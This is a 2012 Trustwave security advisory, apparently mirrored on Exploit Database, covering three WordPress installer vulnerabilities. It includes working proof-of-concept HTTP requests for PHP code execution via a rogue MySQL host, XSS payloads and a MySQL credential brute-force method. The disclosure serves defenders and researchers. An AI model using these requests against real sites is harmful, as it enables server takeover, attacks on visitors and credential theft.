Trustwave's SpiderLabs Security Advisory TWSL2012-002:
Multiple Vulnerabilities in WordPress

https://www.trustwave.com/spiderlabs/advisories/TWSL2012-002.txt

Published: 1/24/12
Version: 1.0

Vendor: WordPress (http://wordpress.org/)
Product: WordPress
Version affected: 3.3.1 and prior

Product description:
WordPress is a free and open source blogging tool and publishing platform
powered by PHP and MySQL.

Credit: Jonathan Claudius of Trustwave SpiderLabs

Finding 1: PHP Code Execution and Persistent Cross Site Scripting
Vulnerabilities via 'setup-config.php' page.
CVE: CVE-2011-4899

The WordPress 'setup-config.php' installation page allows users to install
WordPress in local or remote MySQL databases. This typically requires a user
to have valid MySQL credentials to complete.  However, a malicious user can
host their own MySQL database server and can successfully complete the
WordPress installation without having valid credentials on the target system.

After the successful installation of WordPress, a malicious user can inject
malicious PHP code via the WordPress Themes editor.  In addition, with control
of the database store, malicious Javascript can be injected into the content
of WordPress yielding persistent Cross Site Scripting.

Proof of Concept:

Servers Involved

A.B.C.D = Target WordPress Web Server
W.X.Y.Z = Malicious User's MySQL Instance

1.) Malicious User hosts their own MySQL instance at W.X.Y.Z on port 3306

2.) Performs POST/GET Requests to Install WordPress into MySQL Instance

Request #1
----------
POST /wp-admin/setup-config.php?step=2 HTTP/1.1
Host: A.B.C.D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Cookie: wp-settings-time-1=1322687480; wp-settings-1=m9%3Do
If-Modified-Since: Wed, 07 Dec 2011 16:03:33 GMT

3.) Get PHP Code Execution

Malicious user edits 404.php via Themes Editor as follows:

<?php
phpinfo();
?>

Note #1: Any php file in the theme could be used.
Note #2: Depending settings, PHP may be used to execute system commands
         on webserver.

Malicious user performs get request of modified page to execute code.

Request
-------
GET /wp-content/themes/default/404.php HTTP/1.1
Host: A.B.C.D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1

4.) Get Persistent Cross Site Scripting

Malicious User Injects Malicious Javascript into their own MySQL database instance

MySQL Query
-----------
update wp_comments SET
comment_content='<script>alert('123')</script>' where comment_content='Hi,
this is a comment.<br />To delete \ a comment, just log in and view the
post's comments. There you will have the option to edit or delete
them.';

Non-malicious User Visits Wordpress installation and has Javascript executed on their browser

Request
-------
GET /?p=1 HTTP/1.1
Host: A.B.C.D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1

Finding 2: Multiple Cross Site Scripting Vulnerabilities in
'setup-config.php' page
CVE: CVE-2012-0782

The WordPress 'setup-config.php' installation page allows users to install
WordPress in local or remote MySQL databases. When using this installation page
the user is asked to supply the database name, the server that the database
resides on, and a valid MySQL username and password.

During this process, malicious users can supply javascript within
the "dbname", "dbhost" or "uname" parameters. Upon clicking the submission
button, the javascript is rendered in the client's browser.

Proof of Concept:

Servers Involved

A.B.C.D = Target WordPress Web Server

Request
-------
POST /wp-admin/setup-config.php?step=2 HTTP/1.1
Host: A.B.C.D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Proxy-Connection: keep-alive
Referer: http://A.B.C.D/wp-admin/setup-config.php?step=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 112

dbname=%3Cscript%3Ealert%28%27123%27%29%3C%2Fscript%3E&uname=root&pwd=&dbhost=localhost&prefix=wp_&submit=Submit

Finding 3: MySQL Server Username/Password Disclosure Vulnerability via
'setup-config.php' page
CVE: CVE-2011-4898

The WordPress 'setup-config.php' installation page allows users to install
WordPress in local or remote MySQL databases. When using this installation page
the user is asked to supply the database name, the server the database resides
on, and a valid MySQL username and password.

Malicious users can omit the "dbname" parameter during this process, allowing
them to continually bruteforce MySQL instance usernames and passwords. This
includes any local or remote MySQL instances which are accessible to the
target web server. This can also be used as a method to proxy MySQL bruteforce
attacks against other MySQL instances outside of the target organization.

Proof of Concept:

Servers Involved

A.B.C.D = Target WordPress Web Server
L.M.N.O = Any MySQL Server for which the Web Server has network access

Request
-------
POST /wp-admin/setup-config.php?step=2 HTTP/1.1
Host: A.B.C.D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Proxy-Connection: keep-alive
Referer: http://A.B.C.D/wp-admin/setup-config.php?step=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

uname=mysql&pwd=mysql&dbhost=L.M.N.O

Response (If Password is Valid)
-------------------------------
<---snip-->
We were able to connect to the database server (which means your username
and password is okay) but not able to select the database.
<---snip-->

Response (If Password is Invalid)
---------------------------------
<---snip-->
This either means that the username and password information in your
wp-config.php file is incorrect or we can't contact the database server at
localhost. This could mean your host's database server is down.
<---snip-->

Vendor Response:
Due to the fact that the component in question is an installation script,
the vendor has stated that the attack surface is too small to warrant
a fix:

"We give priority to a better user experience at the install process. It is
unlikely a user would go to the trouble of installing a copy of WordPress
and then not finishing the setup process more-or-less immediately. The
window of opportunity for exploiting such a vulnerability is very small."

However, Trustwave SpiderLabs urges caution in situations where the
WordPress installation script is provided as part of a default image.
This is  often done as a convenience on hosting providers, even in
cases where the client does not use the software. It is a best practice
to ensure  that no installation scripts are exposed to outsiders, and
these vulnerabilities reinforce the importance of this step.

Remediation Steps:
No official fix for these issues will be released for the WordPress
publishing platform. However, administrators can mitigate these issues by
creating strong MySQL passwords and defining rules within a web application
firewall (WAF) solution. ModSecurity (http://www.modsecurity.org/) has
added rules to the commercial rules feed for these issues, and Trustwave's
vulnerability scanning solution, TrustKeeper, has been updated to detect
exposed installation scripts.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
